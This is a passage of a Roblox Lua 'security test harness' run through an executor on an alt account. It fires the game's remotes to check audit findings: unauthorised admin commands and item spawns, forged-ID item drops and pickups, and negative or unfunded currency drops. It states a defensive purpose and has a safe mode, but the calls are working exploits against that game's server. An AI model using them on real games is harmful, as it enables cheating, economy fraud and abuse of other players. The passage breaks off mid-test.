--[[===========================================================================
    STALKER // Security Test Harness  v1.0
    ---------------------------------------------------------------------------
    WHAT: In-game GUI to test every finding in SECURITY_AUDIT.md against a
          LIVE server. Fires the same remotes an exploiter would, then shows
          you whether the server accepted or rejected them.

    HOW TO USE:
      1. Join your game on a PRIVATE server with TWO accounts:
         - your main (admin, to observe / check logs)
         - an ALT with NO admin rights (run this script here!)
         Most tests are only meaningful from a NON-ADMIN account.
      2. Execute this whole file in your executor on the ALT.
      3. Press RIGHT-SHIFT to toggle the window.
      4. SETUP tab -> "Refresh context", pick a junk item, trader, victim alt.
      5. Run tests top to bottom. Read the LOG tab.

    READING RESULTS:
      [PASS] (green) = server REJECTED the abuse. Good. You are safe here.
      [FAIL] (red)   = server ACCEPTED the abuse. Vulnerable. Fix it.
      [INFO] (grey)  = observation / manual check needed.

    SAFE MODE (on by default): blocks DANGER tests (ban/kick/wipe, spends,
    one-time picks, damaging other players). Turn it off only on a private
    server with consenting alts. CAUTION tests mutate YOUR OWN state
    (drop/use/buy) - use junk items and small amounts.

    This tool is for testing YOUR OWN game. Don't run it in other games.
=============================================================================]]

--// Services ---------------------------------------------------------------
local Players           = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UserInputService  = game:GetService("UserInputService")
local RunService        = game:GetService("RunService")
local LocalPlayer       = Players.LocalPlayer

local Remotes      = ReplicatedStorage:WaitForChild("Remotes")
local TaskRemotes  = ReplicatedStorage:FindFirstChild("TaskRemotes")
local SquadRemotes = ReplicatedStorage:FindFirstChild("SquadRemotes")

local function R(name)
    local r = Remotes:FindFirstChild(name)
    if r then return r end
    return Remotes:WaitForChild(name, 3)
end

-- Optional modules (best effort)
local ItemDatabase, InventoryWire, BridgeNet
pcall(function() ItemDatabase  = require(ReplicatedStorage:WaitForChild("ItemDatabase", 5)) end)
pcall(function() InventoryWire = require(ReplicatedStorage:WaitForChild("InventoryWire", 5)) end)
pcall(function()
    local sph = ReplicatedStorage:FindFirstChild("SPH_Assets")
    if sph and sph:FindFirstChild("Modules") and sph.Modules:FindFirstChild("BridgeNet") then
        BridgeNet = require(sph.Modules.BridgeNet)
    end
end)

--// State ------------------------------------------------------------------
local SAFE_MODE = true
local CTX = {
    invItems   = {},  invSel   = 1,   -- {ID, index, tied, src}
    vicItems   = {},  vicSel   = 1,   -- {ID, index, tied}
    npcs       = {},  npcSel   = 1,   -- instances
    players    = {},  playerSel= 1,   -- players (alts first)
    itemIDs    = {},  itemSel  = 1,   -- all known item IDs (spoof targets)
    tiedList   = {},                  -- distinct tied strings
    balance    = 0,
    factions   = {"MercenaryFactionUniforms", "DutyFactionUniforms", "FreedomFactionUniforms"},
    factionSel = 1,
}

--// Log --------------------------------------------------------------------
local LogLines, LogBox, LogCount = {}, nil, 0
local function ts() return os.date("%H:%M:%S") end
local function log(sev, msg)
    -- sev: INFO | PASS | FAIL | WARN | TEST
    local line = string.format("[%s][%s] %s", ts(), sev, tostring(msg))
    table.insert(LogLines, line)
    if #LogLines > 600 then table.remove(LogLines, 1) end
    print("[HARNESS] " .. line)
    if LogBox then
        pcall(function()
            LogBox.Text = table.concat(LogLines, "\n")
            LogBox.CanvasPosition = Vector2.new(0, 1e9)
        end)
    end
end

local function short(v, n)
    n = n or 120
    local s
    pcall(function() s = tostring(v) end)
    s = tostring(s)
    if #s > n then s = string.sub(s, 1, n) .. "..." end
    return s
end

local function dump(t, depth, seen)
    depth = depth or 0; seen = seen or {}
    if depth > 3 then return "{...}" end
    if type(t) ~= "table" then return short(t, 60) end
    if seen[t] then return "{cycle}" end
    seen[t] = true
    local parts, n = {}, 0
    for k, v in pairs(t) do
        n = n + 1
        if n > 12 then table.insert(parts, "..."); break end
        local ks = tostring(k)
        if type(v) == "table" then
            table.insert(parts, ks .. "=" .. dump(v, depth + 1, seen))
        else
            table.insert(parts, ks .. "=" .. short(v, 40))
        end
    end
    return "{" .. table.concat(parts, ", ") .. "}"
end

--// Remote call helpers ----------------------------------------------------
local function fireEv(name, ...)
    local r = R(name)
    if not r then return false, "remote missing: " .. name end
    if not r:IsA("RemoteEvent") then return false, name .. " is " .. r.ClassName end
    local args = {...}
    local ok, err = pcall(function() r:FireServer(unpack(args)) end)
    if not ok then return false, tostring(err) end
    return true, "fired"
end

local function callFn(folder, name, ...)
    local f = folder or Remotes
    local r = f:FindFirstChild(name)
    if not r then return false, "missing: " .. name end
    if not r:IsA("RemoteFunction") then return false, name .. " is " .. r.ClassName end
    local args = {...}
    local results = {pcall(function() return r:InvokeServer(unpack(args)) end)}
    local ok = table.remove(results, 1)
    if not ok then return false, tostring(results[1]) end
    return true, unpack(results)
end

local function bridge(name)
    if not BridgeNet then return nil, "BridgeNet unavailable" end
    local ok, b = pcall(function() return BridgeNet.CreateBridge(name) end)
    if not ok then return nil, tostring(b) end
    return b
end

--// Inventory scanning -----------------------------------------------------
-- Best-effort generic scanner: finds {ID, ItemIndex} anywhere in a table,
-- tracks enclosing TiedInstance, survives cycles + wire-encoded form.
local function scanItems(root, label)
    local out, seen = {}, {}
    local function walk(node, path, tied, depth)
        if depth > 8 or type(node) ~= "table" or seen[node] then return end
        seen[node] = true
        local t = tied
        if type(node.TiedInstance) == "string" then t = node.TiedInstance end
        -- wire-encoded entry {Index=, Item=}
        if node.Index ~= nil and type(node.Item) == "table" and node.Item.ID ~= nil then
            table.insert(out, {ID = tostring(node.Item.ID), index = node.Index, tied = t, src = label .. ":" .. path})
        elseif node.ItemIndex ~= nil and node.ID ~= nil then
            table.insert(out, {ID = tostring(node.ID), index = node.ItemIndex, tied = t, src = label .. ":" .. path})
        end
        for k, v in pairs(node) do
            if type(v) == "table" then
                walk(v, path .. "." .. tostring(k), t, depth + 1)
            end
        end
    end
    if type(root) == "table" then
        for k, v in pairs(root) do
            if type(v) == "table" then
                local hint = nil
                if type(k) == "string" then hint = k end
                walk(v, tostring(k), hint, 1)
            end
        end
    end
    -- dedupe
    local ded, seenKey = {}, {}
    for _, e in ipairs(out) do
        local k = tostring(e.ID) .. "|" .. tostring(e.index) .. "|" .. tostring(e.tied)
        if not seenKey[k] then seenKey[k] = true; table.insert(ded, e) end
    end
    return ded
end

local function refreshInventory()
    CTX.invItems, CTX.tiedList = {}, {}
    local ok, res = callFn(Remotes, "GetAllInventories")
    if not ok then log("WARN", "GetAllInventories failed: " .. short(res)); return end
    CTX.invItems = scanItems(res, "all")
    local seen = {}
    for _, e in ipairs(CTX.invItems) do
        if e.tied and not seen[e.tied] then seen[e.tied] = true; table.insert(CTX.tiedList, e.tied) end
    end
    CTX.invSel = 1
    log("INFO", string.format("Inventory: %d items, %d tied grids. Raw keys: %s",
        #CTX.invItems, #CTX.tiedList, dump(res, 1)))
    if #CTX.invItems == 0 then
        log("WARN", "No items parsed - shape above. Open inventory UI once, then refresh again.")
    end
end

local function refreshVicinity()
    CTX.vicItems = {}
    local ok, res = callFn(Remotes, "GetVicinityItems")
    if not ok then log("WARN", "GetVicinityItems failed: " .. short(res)); return end
    local items = res
    if type(res) == "table" and res.Items ~= nil then items = res.Items end
    if InventoryWire then
        pcall(function()
            if InventoryWire.IsEncoded and InventoryWire.IsEncoded(items) then
                items = InventoryWire.DecodeItems(items)
            end
        end)
    end
    -- vicinity entries are usually keyed by index already
    if type(items) == "table" then
        for k, v in pairs(items) do
            if type(v) == "table" and v.ID ~= nil then
                table.insert(CTX.vicItems, {ID = tostring(v.ID), index = k, tied = res.Tied or res.tied})
            elseif type(v) == "table" then
                local sub = scanItems({[k] = v}, "vic")
                for _, e in ipairs(sub) do table.insert(CTX.vicItems, e) end
            end
        end
    end
    CTX.vicSel = 1
    log("INFO", string.format("Vicinity: %d items. Raw: %s", #CTX.vicItems, dump(res, 1)))
end

local function refreshNPCs()
    CTX.npcs = {}
    local function consider(m)
        if m:IsA("Model") then table.insert(CTX.npcs, m) end
    end
    local map = workspace:FindFirstChild("Map")
    if map and map:FindFirstChild("NPCs") then
        for _, d in ipairs(map.NPCs:GetDescendants()) do
            if d.Name == "NPCModel" or (d:IsA("Model") and (string.find(d.Name, "Trader") or string.find(d.Name, "NPC"))) then
                consider(d)
            end
        end
    end
    if #CTX.npcs == 0 then
        for _, d in ipairs(workspace:GetDescendants()) do
            if d:IsA("Model") and (string.find(d.Name, "Trader") or d.Name == "NPCModel") then
                consider(d)
                if #CTX.npcs >= 20 then break end
            end
        end
    end
    CTX.npcSel = 1
    log("INFO", "NPCs found: " .. tostring(#CTX.npcs))
    for i, n in ipairs(CTX.npcs) do
        if i <= 10 then log("INFO", "  [" .. i .. "] " .. n:GetFullName()) end
    end
end

local function refreshPlayers()
    CTX.players = {}
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= LocalPlayer then table.insert(CTX.players, p) end
    end
    table.insert(CTX.players, LocalPlayer) -- self last
    CTX.playerSel = 1
    log("INFO", "Players: " .. tostring(#CTX.players) .. " (self listed last)")
end

local function refreshItemIDs()
    CTX.itemIDs = {}
    if ItemDatabase then
        for k, v in pairs(ItemDatabase) do
            if type(k) == "string" and type(v) == "table" then
                table.insert(CTX.itemIDs, k)
            end
        end
        table.sort(CTX.itemIDs)
    end
    CTX.itemSel = 1
    log("INFO", "ItemDatabase IDs loaded: " .. tostring(#CTX.itemIDs))
end

local function refreshBalance()
    local ok, res = callFn(Remotes, "RequestBalance")
    if ok and type(res) == "number" then CTX.balance = res end
    log("INFO", "Balance: " .. tostring(CTX.balance))
end

local function selInv()    return CTX.invItems[CTX.invSel] end
local function selVic()    return CTX.vicItems[CTX.vicSel] end
local function selNPC()    return CTX.npcs[CTX.npcSel] end
local function selPlayer() return CTX.players[CTX.playerSel] end
local function selItemID() return CTX.itemIDs[CTX.itemSel] end

local function countItem(id)
    local n = 0
    for _, e in ipairs(CTX.invItems) do
        if e.ID == id then n = n + 1 end
    end
    return n
end

--// GUI --------------------------------------------------------------------
local gui, main, contentFrames, tabBtns, statusLabels
local BG      = Color3.fromRGB(14, 15, 18)
local PANEL   = Color3.fromRGB(22, 23, 28)
local ROW     = Color3.fromRGB(30, 31, 38)
local TXT     = Color3.fromRGB(230, 230, 235)
local DIM     = Color3.fromRGB(150, 150, 165)
local ACCENT  = Color3.fromRGB(255, 190, 70)
local GREEN   = Color3.fromRGB(110, 210, 120)
local RED     = Color3.fromRGB(235, 100, 100)
local YELLOW  = Color3.fromRGB(235, 200, 100)
local GREY    = Color3.fromRGB(120, 120, 130)
local RISKCOL = { safe = GREEN, caution = YELLOW, danger = RED }

local function mk(class, props, parent)
    local o = Instance.new(class)
    for k, v in pairs(props) do
        pcall(function() o[k] = v end)
    end
    o.Parent = parent
    return o
end

local function buildGUI()
    if LocalPlayer.PlayerGui:FindFirstChild("StalkerSecTest") then
        LocalPlayer.PlayerGui.StalkerSecTest:Destroy()
    end
    gui = mk("ScreenGui", {Name = "StalkerSecTest", ResetOnSpawn = false, IgnoreGuiInset = true, DisplayOrder = 999}, LocalPlayer.PlayerGui)

    main = mk("Frame", {Name = "Main", Size = UDim2.fromOffset(780, 560),
        Position = UDim2.new(0.5, -390, 0.5, -280), BackgroundColor3 = BG,
        BorderSizePixel = 0, Active = true, Draggable = true}, gui)
    mk("UICorner", {CornerRadius = UDim.new(0, 8)}, main)
    mk("UIStroke", {Color = Color3.fromRGB(60, 60, 70), Thickness = 1}, main)

    local top = mk("Frame", {Size = UDim2.new(1, 0, 0, 40), BackgroundColor3 = PANEL, BorderSizePixel = 0}, main)
    mk("UICorner", {CornerRadius = UDim.new(0, 8)}, top)
    mk("TextLabel", {Size = UDim2.new(1, -260, 1, 0), Position = UDim2.fromOffset(12, 0),
        BackgroundTransparency = 1, Text = "STALKER // SECURITY TEST HARNESS",
        Font = Enum.Font.GothamBold, TextSize = 15, TextColor3 = ACCENT,
        TextXAlignment = Enum.TextXAlignment.Left}, top)
    local safeBtn = mk("TextButton", {Size = UDim2.fromOffset(150, 26), Position = UDim2.new(1, -252, 0.5, -13),
        BackgroundColor3 = Color3.fromRGB(50, 110, 60), Text = "SAFE MODE: ON",
        Font = Enum.Font.GothamBold, TextSize = 12, TextColor3 = TXT, BorderSizePixel = 0}, top)
    mk("UICorner", {CornerRadius = UDim.new(0, 4)}, safeBtn)
    safeBtn.MouseButton1Click:Connect(function()
        SAFE_MODE = not SAFE_MODE
        safeBtn.Text = SAFE_MODE and "SAFE MODE: ON" or "SAFE MODE: OFF"
        safeBtn.BackgroundColor3 = SAFE_MODE and Color3.fromRGB(50, 110, 60) or Color3.fromRGB(140, 50, 50)
        log("WARN", "Safe mode " .. (SAFE_MODE and "ENABLED (danger tests blocked)" or "DISABLED (all tests live!)"))
    end)
    local hideBtn = mk("TextButton", {Size = UDim2.fromOffset(80, 26), Position = UDim2.new(1, -92, 0.5, -13),
        BackgroundColor3 = ROW, Text = "HIDE (RSHIFT)", Font = Enum.Font.Gotham,
        TextSize = 11, TextColor3 = DIM, BorderSizePixel = 0}, top)
    mk("UICorner", {CornerRadius = UDim.new(0, 4)}, hideBtn)
    hideBtn.MouseButton1Click:Connect(function() main.Visible = false end)

    local tabs = mk("Frame", {Size = UDim2.new(0, 130, 1, -40), Position = UDim2.fromOffset(0, 40),
        BackgroundColor3 = PANEL, BorderSizePixel = 0}, main)
    local tabList = mk("UIListLayout", {Padding = UDim.new(0, 4), SortOrder = Enum.SortOrder.LayoutOrder}, tabs)
    mk("UIPadding", {PaddingTop = UDim.new(0, 8), PaddingLeft = UDim.new(0, 8),
        PaddingRight = UDim.new(0, 8)}, tabs)

    contentFrames, tabBtns, statusLabels = {}, {}, {}
    return tabs
end

local TAB_ORDER = {"SETUP", "CRITICAL", "DUPES", "ECONOMY", "COMBAT", "MISC", "LOG"}
local function buildTabs(tabs)
    local content = mk("Frame", {Size = UDim2.new(1, -130, 1, -40), Position = UDim2.fromOffset(130, 40),
        BackgroundTransparency = 1}, main)
    for i, name in ipairs(TAB_ORDER) do
        local b = mk("TextButton", {Size = UDim2.new(1, 0, 0, 34), BackgroundColor3 = ROW,
            Text = name, Font = Enum.Font.GothamBold, TextSize = 13, TextColor3 = DIM,
            BorderSizePixel = 0, LayoutOrder = i}, tabs)
        mk("UICorner", {CornerRadius = UDim.new(0, 4)}, b)
        tabBtns[name] = b
        local scroll = mk("ScrollingFrame", {Size = UDim2.fromScale(1, 1), BackgroundTransparency = 1,
            BorderSizePixel = 0, ScrollBarThickness = 5, ScrollBarImageColor3 = ACCENT,
            AutomaticCanvasSize = Enum.AutomaticSize.Y, CanvasSize = UDim2.new(0, 0, 0, 0),
            Visible = false}, content)
        local layout = mk("UIListLayout", {Padding = UDim.new(0, 4), SortOrder = Enum.SortOrder.LayoutOrder}, scroll)
        mk("UIPadding", {PaddingTop = UDim.new(0, 8), PaddingLeft = UDim.new(0, 8),
            PaddingRight = UDim.new(0, 12), PaddingBottom = UDim.new(0, 8)}, scroll)
        contentFrames[name] = scroll
        b.MouseButton1Click:Connect(function() showTab(name) end)
    end
end

function showTab(name)
    for n, f in pairs(contentFrames) do f.Visible = (n == name) end
    for n, b in pairs(tabBtns) do
        b.BackgroundColor3 = (n == name) and Color3.fromRGB(50, 55, 70) or ROW
        b.TextColor3 = (n == name) and TXT or DIM
    end
end

local testCounter = 0
-- risk: "safe" | "caution" | "danger"
local function addTest(tab, id, label, risk, fn)
    testCounter = testCounter + 1
    local row = mk("Frame", {Size = UDim2.new(1, 0, 0, 34), BackgroundColor3 = ROW,
        BorderSizePixel = 0, LayoutOrder = testCounter}, contentFrames[tab])
    mk("UICorner", {CornerRadius = UDim.new(0, 4)}, row)
    local dot = mk("Frame", {Size = UDim2.fromOffset(8, 8), Position = UDim2.new(0, 8, 0.5, -4),
        BackgroundColor3 = RISKCOL[risk] or GREY, BorderSizePixel = 0}, row)
    mk("UICorner", {CornerRadius = UDim.new(1, 0)}, dot)
    local btn = mk("TextButton", {Size = UDim2.new(1, -120, 1, 0), Position = UDim2.fromOffset(24, 0),
        BackgroundTransparency = 1, Text = "[" .. id .. "] " .. label,
        Font = Enum.Font.Gotham, TextSize = 12, TextColor3 = TXT,
        TextXAlignment = Enum.TextXAlignment.Left, TextTruncate = Enum.TextTruncate.AtEnd}, row)
    local st = mk("TextLabel", {Size = UDim2.new(0, 100, 1, 0), Position = UDim2.new(1, -104, 0, 0),
        BackgroundTransparency = 1, Text = "[ -- ]", Font = Enum.Font.GothamBold,
        TextSize = 12, TextColor3 = GREY, TextXAlignment = Enum.TextXAlignment.Right}, row)
    statusLabels[id] = st
    btn.MouseButton1Click:Connect(function()
        if risk == "danger" and SAFE_MODE then
            st.Text = "[BLOCKED]"; st.TextColor3 = YELLOW
            log("WARN", id .. " blocked by SAFE MODE (toggle off to run)")
            return
        end
        st.Text = "[ ... ]"; st.TextColor3 = YELLOW
        log("TEST", "== " .. id .. ": " .. label .. " ==")
        task.spawn(function()
            local ok, verdict, detail = pcall(fn)
            if not ok then
                st.Text = "[ERROR]"; st.TextColor3 = RED
                log("WARN", id .. " harness error: " .. short(verdict))
                return
            end
            verdict = verdict or "INFO"
            if verdict == "PASS" then st.Text = "[PASS]"; st.TextColor3 = GREEN
            elseif verdict == "FAIL" then st.Text = "[FAIL]"; st.TextColor3 = RED
            else st.Text = "[INFO]"; st.TextColor3 = GREY end
            if detail then log(verdict == "INFO" and "INFO" or verdict, id .. " :: " .. tostring(detail)) end
        end)
    end)
end

local function addHeader(tab, text)
    testCounter = testCounter + 1
    mk("TextLabel", {Size = UDim2.new(1, 0, 0, 22), BackgroundTransparency = 1,
        Text = text, Font = Enum.Font.GothamBold, TextSize = 12, TextColor3 = ACCENT,
        TextXAlignment = Enum.TextXAlignment.Left, LayoutOrder = testCounter}, contentFrames[tab])
end

local function addNote(tab, text)
    testCounter = testCounter + 1
    local l = mk("TextLabel", {Size = UDim2.new(1, 0, 0, 14), BackgroundTransparency = 1,
        Text = text, Font = Enum.Font.Gotham, TextSize = 11, TextColor3 = DIM,
        TextXAlignment = Enum.TextXAlignment.Left, TextWrapped = true,
        AutomaticSize = Enum.AutomaticSize.Y, LayoutOrder = testCounter}, contentFrames[tab])
    return l
end

-- Selector: label + < value >  (cycles a list via get/set callbacks)
local function addSelector(tab, label, getText, onPrev, onNext)
    testCounter = testCounter + 1
    local row = mk("Frame", {Size = UDim2.new(1, 0, 0, 30), BackgroundColor3 = ROW,
        BorderSizePixel = 0, LayoutOrder = testCounter}, contentFrames[tab])
    mk("UICorner", {CornerRadius = UDim.new(0, 4)}, row)
    mk("TextLabel", {Size = UDim2.new(0, 150, 1, 0), Position = UDim2.fromOffset(8, 0),
        BackgroundTransparency = 1, Text = label, Font = Enum.Font.GothamBold,
        TextSize = 11, TextColor3 = DIM, TextXAlignment = Enum.TextXAlignment.Left}, row)
    local val = mk("TextLabel", {Size = UDim2.new(1, -220, 1, 0), Position = UDim2.fromOffset(158, 0),
        BackgroundTransparency = 1, Text = "", Font = Enum.Font.Code,
        TextSize = 11, TextColor3 = TXT, TextXAlignment = Enum.TextXAlignment.Left,
        TextTruncate = Enum.TextTruncate.AtEnd}, row)
    local function refresh() val.Text = getText() end
    local prev = mk("TextButton", {Size = UDim2.fromOffset(28, 22), Position = UDim2.new(1, -64, 0.5, -11),
        BackgroundColor3 = PANEL, Text = "<", Font = Enum.Font.GothamBold,
        TextSize = 14, TextColor3 = TXT, BorderSizePixel = 0}, row)
    local next = mk("TextButton", {Size = UDim2.fromOffset(28, 22), Position = UDim2.new(1, -32, 0.5, -11),
        BackgroundColor3 = PANEL, Text = ">", Font = Enum.Font.GothamBold,
        TextSize = 14, TextColor3 = TXT, BorderSizePixel = 0}, row)
    prev.MouseButton1Click:Connect(function() onPrev(); refresh() end)
    next.MouseButton1Click:Connect(function() onNext(); refresh() end)
    refresh()
    return refresh
end

local function addInput(tab, label, default)
    testCounter = testCounter + 1
    local row = mk("Frame", {Size = UDim2.new(1, 0, 0, 30), BackgroundColor3 = ROW,
        BorderSizePixel = 0, LayoutOrder = testCounter}, contentFrames[tab])
    mk("UICorner", {CornerRadius = UDim.new(0, 4)}, row)
    mk("TextLabel", {Size = UDim2.new(0, 150, 1, 0), Position = UDim2.fromOffset(8, 0),
        BackgroundTransparency = 1, Text = label, Font = Enum.Font.GothamBold,
        TextSize = 11, TextColor3 = DIM, TextXAlignment = Enum.TextXAlignment.Left}, row)
    local box = mk("TextBox", {Size = UDim2.new(1, -166, 1, -8), Position = UDim2.fromOffset(158, 4),
        BackgroundColor3 = BG, Text = default or "", Font = Enum.Font.Code,
        TextSize = 12, TextColor3 = TXT, BorderSizePixel = 0, ClearTextOnFocus = false}, row)
    mk("UICorner", {CornerRadius = UDim.new(0, 4)}, box)
    return box
end

local SelectorRefresh = {}
local function cyc(list, sel, dir)
    if #list == 0 then return sel end
    sel = sel + dir
    if sel < 1 then sel = #list end
    if sel > #list then sel = 1 end
    return sel
end

--// Gun / melee discovery --------------------------------------------------
local function findGun()
    local char = LocalPlayer.Character
    local packs = {}
    if char then table.insert(packs, char) end
    local bp = LocalPlayer:FindFirstChild("Backpack")
    if bp then table.insert(packs, bp) end
    for _, c in ipairs(packs) do
        for _, t in ipairs(c:GetChildren()) do
            if t:IsA("Tool") and t:FindFirstChild("SPH_Weapon") then return t end
        end
    end
    return nil
end

local function findMelee()
    local char = LocalPlayer.Character
    local packs = {}
    if char then table.insert(packs, char) end
    local bp = LocalPlayer:FindFirstChild("Backpack")
    if bp then table.insert(packs, bp) end
    for _, c in ipairs(packs) do
        for _, t in ipairs(c:GetChildren()) do
            if t:IsA("Tool") then
                local rems = t:FindFirstChild("Remotes")
                if rems and rems:FindFirstChild("RemoteEventMelee") then return t end
            end
        end
    end
    return nil
end

local function victimHead()
    local p = selPlayer()
    if not p or not p.Character then return nil end
    return p.Character:FindFirstChild("Head"), p
end

--// Build all ----------------------------------------------------------------
local tabs = buildGUI()
buildTabs(tabs)

-- ============================ SETUP ========================================
addHeader("SETUP", "CONTEXT - refresh first, then pick targets")
addNote("SETUP", "Run on a NON-ADMIN alt. Pick a JUNK item for destructive tests.")

addTest("SETUP", "S0", "Refresh ALL context (inv, vicinity, npcs, players, db)", "safe", function()
    refreshInventory(); refreshVicinity(); refreshNPCs(); refreshPlayers(); refreshItemIDs(); refreshBalance()
    for _, f in ipairs(SelectorRefresh) do pcall(f) end
    return "INFO", string.format("inv=%d vic=%d npc=%d players=%d itemIDs=%d bal=%s",
        #CTX.invItems, #CTX.vicItems, #CTX.npcs, #CTX.players, #CTX.itemIDs, tostring(CTX.balance))
end)

table.insert(SelectorRefresh, addSelector("SETUP", "My item (junk!)", function()
    local e = selInv()
    if not e then return "(none - refresh)" end
    return string.format("%s | idx=%s | tied=%s", e.ID, tostring(e.index), tostring(e.tied))
end, function() CTX.invSel = cyc(CTX.invItems, CTX.invSel, -1) end,
   function() CTX.invSel = cyc(CTX.invItems, CTX.invSel, 1) end))

table.insert(SelectorRefresh, addSelector("SETUP", "Vicinity item", function()
    local e = selVic()
    if not e then return "(none nearby - drop something)" end
    return string.format("%s | idx=%s", e.ID, tostring(e.index))
end, function() CTX.vicSel = cyc(CTX.vicItems, CTX.vicSel, -1) end,
   function() CTX.vicSel = cyc(CTX.vicItems, CTX.vicSel, 1) end))

table.insert(SelectorRefresh, addSelector("SETUP", "Trader NPC", function()
    local n = selNPC()
    if not n then return "(none found)" end
    return n:GetFullName()
end, function() CTX.npcSel = cyc(CTX.npcs, CTX.npcSel, -1) end,
   function() CTX.npcSel = cyc(CTX.npcs, CTX.npcSel, 1) end))

table.insert(SelectorRefresh, addSelector("SETUP", "Target player", function()
    local p = selPlayer()
    if not p then return "(none)" end
    return p.Name .. (p == LocalPlayer and " (YOU)" or " (alt)")
end, function() CTX.playerSel = cyc(CTX.players, CTX.playerSel, -1) end,
   function() CTX.playerSel = cyc(CTX.players, CTX.playerSel, 1) end))

table.insert(SelectorRefresh, addSelector("SETUP", "Spoof item ID", function()
    return selItemID() or "(db missing)"
end, function() CTX.itemSel = cyc(CTX.itemIDs, CTX.itemSel, -1) end,
   function() CTX.itemSel = cyc(CTX.itemIDs, CTX.itemSel, 1) end))

table.insert(SelectorRefresh, addSelector("SETUP", "Faction key", function()
    return CTX.factions[CTX.factionSel]
end, function() CTX.factionSel = cyc(CTX.factions, CTX.factionSel, -1) end,
   function() CTX.factionSel = cyc(CTX.factions, CTX.factionSel, 1) end))

addTest("SETUP", "S1", "Dump remote inventory (all folders)", "safe", function()
    for _, f in ipairs({Remotes, TaskRemotes, SquadRemotes,
        ReplicatedStorage:FindFirstChild("PdaRemotes"),
        ReplicatedStorage:FindFirstChild("ContactRemotes"),
        ReplicatedStorage:FindFirstChild("ReplecsRemotes"),
        ReplicatedStorage:FindFirstChild("JABBY_REMOTES")}) do
        if f then
            local ev, fn = 0, 0
            for _, c in ipairs(f:GetChildren()) do
                if c:IsA("RemoteEvent") or c:IsA("UnreliableRemoteEvent") then ev = ev + 1
                elseif c:IsA("RemoteFunction") then fn = fn + 1 end
            end
            log("INFO", string.format("%s: %d events, %d functions", f.Name, ev, fn))
        end
    end
    return "INFO", "see log"
end)

addTest("SETUP", "S2", "Dump my full inventory (check scoping)", "safe", function()
    for i, e in ipairs(CTX.invItems) do
        if i <= 40 then
            log("INFO", string.format("  %s idx=%s tied=%s src=%s", e.ID, tostring(e.index), tostring(e.tied), tostring(e.src)))
        end
    end
    return "INFO", tostring(#CTX.invItems) .. " items (capped at 40 shown)"
end)

-- ============================ CRITICAL =====================================
addHeader("CRITICAL", "C1 - ADMIN REMOTES (must fail on non-admin alt!)")

addTest("CRITICAL", "C1a", "AdminListItems probe (read-only)", "safe", function()
    local ok, res = callFn(Remotes, "AdminListItems")
    log("INFO", "AdminListItems -> ok=" .. tostring(ok) .. " res=" .. dump(res, 1))
    if ok and type(res) == "table" and #res > 0 then
        return "FAIL", "non-admin got item list (" .. #res .. " entries) - server has NO rank check"
    end
    return "PASS", "rejected/empty for non-admin"
end)

addTest("CRITICAL", "C1b", 'AdminRunCommand "where" (benign self-cmd)', "safe", function()
    local ok, err = fireEv("AdminRunCommand", "where", {"where"})
    log("INFO", "fired where -> " .. tostring(ok) .. " " .. short(err))
    log("INFO", "Watch for a toast/return. If the server EXECUTES it, C1 is live - then try C1d.")
    return "INFO", "check for server reaction (toast/chat/log on main)"
end)

addTest("CRITICAL", "C1c", "AdminSpawnItem self x1 (selected spoof ID)", "danger", function()
    local id = selItemID()
    if not id then return "INFO", "no item DB" end
    local before = #CTX.invItems
    local ok, err = fireEv("AdminSpawnItem", id, 1)
    task.wait(1)
    refreshInventory()
    log("INFO", string.format("spawn %s -> fired=%s inv %d -> %d", id, tostring(ok), before, #CTX.invItems))
    if #CTX.invItems > before then
        return "FAIL", "ITEM SPAWNED for non-admin - critical"
    end
    return "PASS", "no item granted"
end)

local c1cmd = addInput("CRITICAL", "Cmd", "addroubles")
local c1arg = addInput("CRITICAL", "Arg", "10000")
addTest("CRITICAL", "C1d", "AdminRunCommand CUSTOM (DANGER)", "danger", function()
    local bal0 = CTX.balance
    refreshBalance(); bal0 = CTX.balance
    local ok, err = fireEv("AdminRunCommand", c1cmd.Text, {c1arg.Text})
    task.wait(1)
    refreshBalance()
    log("INFO", string.format("cmd=%s arg=%s bal %s -> %s", c1cmd.Text, c1arg.Text, tostring(bal0), tostring(CTX.balance)))
    return "INFO", "compare balance / watch main for effect"
end)
addNote("CRITICAL", 'Try: addroubles, roubles 0, god, heal, tp <name>, ban <alt> perm. NEVER on real players.')

addHeader("CRITICAL", "C2 - ITEM-ID SPOOF (transmutation)")
addNote("CRITICAL", "Drops your SELECTED item while claiming a different ID. Pick junk!")

addTest("CRITICAL", "C2a", "DropItem with FORGED id", "caution", function()
    local e, spoof = selInv(), selItemID()
    if not e then return "INFO", "select an item in SETUP first" end
    if not spoof then return "INFO", "no item DB" end
    if e.ID == spoof then return "INFO", "pick a DIFFERENT spoof ID than the item" end
    log("INFO", string.format("dropping idx=%s tied=%s real=%s CLAIMED=%s",
        tostring(e.index), tostring(e.tied), e.ID, spoof))
    local ok, err = fireEv("DropItem", e.index, e.tied, spoof)
    task.wait(1)
    refreshVicinity(); refreshInventory()
    local spawnedSpoof = false
    for _, v in ipairs(CTX.vicItems) do
        if v.ID == spoof then spawnedSpoof = true end
    end
    if spawnedSpoof then
        return "FAIL", "world item spawned with FORGED id " .. spoof .. " - transmutation live!"
    end
    return "PASS", "server ignored forged id (or rejected). Pick your item back up."
end)

addTest("CRITICAL", "C2b", 'ContextMenuAction "Take" with forged id', "caution", function()
    local v = selVic()
    local spoof = selItemID()
    if not v then return "INFO", "need a vicinity item (drop junk nearby, refresh)" end
    local ok, err = fireEv("ContextMenuAction", "Take", v.index, v.tied, spoof)
    task.wait(1); refreshInventory()
    log("INFO", "Take forged -> " .. tostring(ok) .. " " .. short(err))
    return "INFO", "check if you received " .. tostring(spoof) .. " instead of " .. v.ID
end)

addHeader("CRITICAL", "C3 - MONEY (DropRoubles)")
addTest("CRITICAL", "C3a", "DropRoubles(-1000) NEGATIVE", "caution", function()
    refreshBalance(); local b0 = CTX.balance
    fireEv("DropRoubles", -1000)
    task.wait(1); refreshBalance()
    log("INFO", string.format("bal %s -> %s", tostring(b0), tostring(CTX.balance)))
    if CTX.balance > b0 then return "FAIL", "NEGATIVE drop INCREASED balance - infinite money!" end
    return "PASS", "negative rejected"
end)

addTest("CRITICAL", "C3b", "DropRoubles(balance+999999) UNFUNDED", "caution", function()
    refreshBalance(); local b0 = CTX.balance
    fireEv("DropRoubles", b0 + 999999)
    task.wait(1); refreshBalance(); refreshVicinity()
    local found = false
    for _, v in ipairs(CTX.vicItems) do
